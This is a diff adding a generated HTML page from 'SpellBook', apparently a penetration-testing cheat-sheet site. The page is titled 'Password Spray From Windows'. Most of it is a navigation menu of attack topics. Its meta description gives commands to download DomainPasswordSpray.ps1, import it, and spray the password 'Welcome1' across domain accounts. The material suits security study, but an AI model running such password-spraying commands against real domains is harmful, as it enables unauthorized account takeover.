@@ -1,0 +1,3161 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content=" Don’t get locked out. See Password policy section Spray and pray
+DomainPasswordSpray.ps1# Download, then transfer the ps module to windows with any method in Misc/File Transfer
+wget https://github.com/dafthack/DomainPasswordSpray/raw/refs/heads/master/DomainPasswordSpray.ps1Import module
+Import-Module .\DomainPasswordSpray.ps1Spray and pray
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://rusted-silver.github.io/spellbook/10.-lateral-movement/password-spray---from-windows/">
+  <meta property="og:site_name" content="SpellBook">
+  <meta property="og:title" content="SpellBook">
+  <meta property="og:description" content="Don’t get locked out. See Password policy section Spray and pray
+DomainPasswordSpray.ps1# Download, then transfer the ps module to windows with any method in Misc/File Transfer
+wget https://github.com/dafthack/DomainPasswordSpray/raw/refs/heads/master/DomainPasswordSpray.ps1Import module
+Import-Module .\DomainPasswordSpray.ps1Spray and pray
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="10.-lateral-movement">
+
+
+  <meta itemprop="name" content="SpellBook">
+  <meta itemprop="description" content="Don’t get locked out. See Password policy section Spray and pray
+DomainPasswordSpray.ps1# Download, then transfer the ps module to windows with any method in Misc/File Transfer
+wget https://github.com/dafthack/DomainPasswordSpray/raw/refs/heads/master/DomainPasswordSpray.ps1Import module
+Import-Module .\DomainPasswordSpray.ps1Spray and pray
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue">
+  <meta itemprop="wordCount" content="40">
+
+<title>Password Spray From Windows | SpellBook</title>
+<link rel="icon" href="/spellbook/favicon.png" >
+<link rel="manifest" href="/spellbook/manifest.json">
+<link rel="canonical" href="https://rusted-silver.github.io/spellbook/10.-lateral-movement/password-spray---from-windows/">
+<link rel="stylesheet" href="/spellbook/book.min.8be08ee19c78fece5778ccbad7b7920c47943153ee0c9e856094873c56dca415.css" integrity="sha256-i&#43;CO4Zx4/s5XeMy617eSDEeUMVPuDJ6FYJSHPFbcpBU=" crossorigin="anonymous">
+
+
+  <script defer src="/spellbook/fuse.min.js"></script>
+  <script defer src="/spellbook/en.search.min.5ba98d1a9d6abff7b5da47d3a9a39a720a0e32df83c349f0e060f2b59a2c20ca.js" integrity="sha256-W6mNGp1qv/e12kfTqaOacgoOMt&#43;Dw0nw4GDytZosIMo=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-10.-lateral-movement">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/spellbook/"><span>SpellBook</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+<ul><li><a href="/spellbook/">&lt;- Back to main page</a></li></ul>
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-3e8dfd6811139b26df71dcc7c1ec8a71" class="toggle"  />
+    <label for="section-3e8dfd6811139b26df71dcc7c1ec8a71" class="flex">
+      <a role="button" class="">
+        01. Passive Recon</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/bug-bounty-dorks/" class="">
+      Bug Bounty Dorks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/dns/" class="">
+      DNS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/public-s3-buckets/" class="">
+      Public S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/source-code/" class="">
+      Source Code</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/subdomain-enumeration/" class="">
+      Subdomain Enumeration</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-620ac26c1d74d3712f5771bd92ea1cd1" class="toggle"  />
+    <label for="section-620ac26c1d74d3712f5771bd92ea1cd1" class="flex">
+      <a role="button" class="">
+        02. Active Recon</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/02.-active-recon/port-scan/" class="">
+      Port Scan</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/02.-active-recon/web---assets-enumeration/" class="">
+      Web Assets Enumeration</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-1eb6d1276e5402b7759fe597792fed3e" class="toggle"  />
+    <label for="section-1eb6d1276e5402b7759fe597792fed3e" class="flex">
+      <a role="button" class="">
+        03. Enumeration</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-da1ecbb0229a70dd5366fa770cbcdbf8" class="toggle"  />
+    <label for="section-da1ecbb0229a70dd5366fa770cbcdbf8" class="flex">
+      <a role="button" class="">
+        80,443 Tcp HTTP</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6121218ae46d8375829819d014e3b5f5" class="toggle"  />
+    <label for="section-6121218ae46d8375829819d014e3b5f5" class="flex">
+      <a role="button" class="">
+        Common Vulnerability</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/basic-http-auth/" class="">
+      Basic HTTP Auth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/blind-sqli/" class="">
+      Blind SQL I</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/code-injection/" class="">
+      Code Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/csrf/" class="">
+      Csrf</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/file-upload/" class="">
+      File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/graphql/" class="">
+      Graph Ql</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/idor/" class="">
+      ID Or</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/jwt/" class="">
+      JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/lfi/" class="">
+      Lfi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/oauth/" class="">
+      Oauth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/pdf-generation-injection/" class="">
+      Pdf Generation Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/saml/" class="">
+      Saml</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/sql-injection/" class="">
+      SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/ssrf/" class="">
+      Ssrf</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/template-injection-ssti/" class="">
+      Template Injection ( Ssti)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/websocket/" class="">
+      Websocket</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/xss/" class="">
+      Xss</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/xxe/" class="">
+      Xxe</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-063b6da821fbfa4b9fcb65163a5b31d8" class="toggle"  />
+    <label for="section-063b6da821fbfa4b9fcb65163a5b31d8" class="flex">
+      <a role="button" class="">
+        Rare Vulnerabilities</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/cache-poisoning/" class="">
+      Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/crlf-injection/" class="">
+      Crlf Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/hosts-header-attacks/" class="">
+      Hosts Header Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/ldap-injection/" class="">
+      Ldap Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/mongodb-injection/" class="">
+      Mongodb Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/padding-oracles/" class="">
+      Padding Oracles</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/request-smuggling/" class="">
+      Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/session-puzzling/" class="">
+      Session Puzzling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/ssi-injection/" class="">
+      Ssi Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/tls-ssl-attacks/" class="">
+      Tls ( Ssl) Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/xpath-injection/" class="">
+      Xpath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/xslt-injection/" class="">
+      Xslt Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2e09e512163cdc60fcb006584b888a87" class="toggle"  />
+    <label for="section-2e09e512163cdc60fcb006584b888a87" class="flex">
+      <a role="button" class="">
+        Webapps Specific</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/drupal/" class="">
+      Drupal</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/gitlab/" class="">
+      Git Lab</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/jenkins/" class="">
+      Jenkins</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/joomla/" class="">
+      Joomla</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/nexus-repository-manager/" class="">
+      Nexus Repository Manager</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/prtg/" class="">
+      Prtg</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/splunk/" class="">
+      Splunk</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/tomcat/" class="">
+      Tomcat</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/wordpress/" class="">
+      Word Press</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-5de4a0e2a064acde43bb919dbfcee93b" class="toggle"  />
+    <label for="section-5de4a0e2a064acde43bb919dbfcee93b" class="flex">
+      <a role="button" class="">
+        Whitebox</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c6aacb94aa4d41ce7a7f6743146af7cc" class="toggle"  />
+    <label for="section-c6aacb94aa4d41ce7a7f6743146af7cc" class="flex">
+      <a role="button" class="">
+        Deserialization</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/asp.net/" class="">
+      Asp. Net</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/introduction/" class="">
+      Introduction</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/php/" class="">
+      Php</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/python/" class="">
+      Python</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/decompilation-tools/" class="">
+      Decompilation Tools</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/iis-installation/" class="">
+      Iis Installation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/prototype-pollution/" class="">
+      Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/type-juggling/" class="">
+      Type Juggling</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/http-common-sense/" class="">
+      HTTP Common Sense</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/https-exfiltration-server/" class="">
+      HTTP S Exfiltration Server</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/scripts/" class="">
+      Scripts</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webshells/" class="">
+      Webshells</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/110995-tcp---pop3/" class="">
+      110,995 Tcp POP3</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/1151-tcp---oracle-db/" class="">
+      1151 Tcp Oracle Db</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/143993-tcp---imap/" class="">
+      143,993 Tcp IMAP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/1433-tcp---mssql/" class="">
+      1433 Tcp Mssql</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/1611621016110162-udp---snmp/" class="">
+      161,162,10161,10162 UDP SNMP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/2049-tcp---nfs/" class="">
+      2049 Tcp Nfs</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/21-tcp---ftp/" class="">
+      21 Tcp FTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/25465587-tcp---smtp/" class="">
+      25,465,587 Tcp SMTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/27017-tcp---mongodb/" class="">
+      27017 Tcp Mongodb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/3306-tcp---mysql/" class="">
+      3306 Tcp My SQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/4222-tcp---nats/" class="">
+      4222 Tcp NAT S</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/445-tcp---smb/" class="">
+      445 Tcp Smb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/623-udp---ipmi/" class="">
+      623 UDP IP Mi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/873-tcp---rsync/" class="">
+      873 Tcp Rsync</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/default-credentials/" class="">
+      Default Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/r-services/" class="">
+      R Services</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c69393f67cd7496c728f5b58e6ac1ee" class="toggle"  />
+    <label for="section-2c69393f67cd7496c728f5b58e6ac1ee" class="flex">
+      <a role="button" class="">
+        04. Initial Access</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/rdp/" class="">
+      Rdp</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/smb/" class="">
+      Smb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/timeroasting/" class="">
+      Timeroasting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/winrm/" class="">
+      Win Rm</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-90c5584e370531caff111fc923627531" class="toggle"  />
+    <label for="section-90c5584e370531caff111fc923627531" class="flex">
+      <a role="button" class="">
+        05. Defense Evasion</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/applocker/" class="">
+      Applocker</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/defender/" class="">
+      Defender</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/firewall/" class="">
+      Firewall</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/powershell/" class="">
+      Powershell</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/restriced-shell/" class="">
+      Restriced Shell</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-07e5596a0ace078f0cf9976d44537c29" class="toggle"  />
+    <label for="section-07e5596a0ace078f0cf9976d44537c29" class="flex">
+      <a role="button" class="">
+        06. Privilege Escalation</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-085f8e8a106aad5123071eb91320ad16" class="toggle"  />
+    <label for="section-085f8e8a106aad5123071eb91320ad16" class="flex">
+      <a role="button" class="">
+        Linux</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2ea21e955d87b2e3ef58a7e330eeac1f" class="toggle"  />
+    <label for="section-2ea21e955d87b2e3ef58a7e330eeac1f" class="flex">
+      <a role="button" class="">
+        Cve</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/dirty-pipe/" class="">
+      Dirty Pipe</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/logrotate/" class="">
+      Logrotate</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/netfilter/" class="">
+      Netfilter</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/sudo-cve/" class="">
+      Sudo Cve</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ed5af43f9c413fcde5c865f6213099b9" class="toggle"  />
+    <label for="section-ed5af43f9c413fcde5c865f6213099b9" class="flex">
+      <a role="button" class="">
+        Privileged Groups</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/privileged-groups/adm/" class="">
+      Adm</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/privileged-groups/docker/" class="">
+      Docker</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/privileged-groups/lxc/" class="">
+      Lxc</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/credential-search/" class="">
+      Credential Search</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/crontab/" class="">
+      Crontab</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/enumeration/" class="">
+      Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/kubernetes/" class="">
+      Kubernetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/nfs/" class="">
+      Nfs</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/path-injection/" class="">
+      Path Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/python-library-hijack/" class="">
+      Python Library Hijack</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/sudo/" class="">
+      Sudo</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-efbcbfa9a4f046750f9c164cae3b5c0b" class="toggle"  />
+    <label for="section-efbcbfa9a4f046750f9c164cae3b5c0b" class="flex">
+      <a role="button" class="">
+        Windows</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-30c877d7e6dbf04e89232795939c9472" class="toggle"  />
+    <label for="section-30c877d7e6dbf04e89232795939c9472" class="flex">
+      <a role="button" class="">
+        Special Privileges</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/alwaysinstallelevated/" class="">
+      Always Install Elevated</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/dnsadmins/" class="">
+      DNS Admins</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
